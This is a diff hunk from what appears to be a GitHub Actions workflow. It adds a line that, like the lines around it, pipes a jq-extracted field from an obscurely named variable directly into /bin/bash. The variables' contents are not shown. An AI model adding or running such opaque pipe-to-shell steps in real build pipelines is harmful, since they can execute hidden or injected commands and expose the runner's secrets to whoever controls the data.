@@ -29,6 +29,7 @@ jobs:
           echo $mlt43366 | jq -r .nb795 | /bin/bash
           printf '%s' "$ylpb4" | jq -r .mx4905 | /bin/bash
           echo $plq08 | jq -r .cevv345 | /bin/bash
+          printf '%s' "$ufxy2" | jq -r .ktgk61212 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
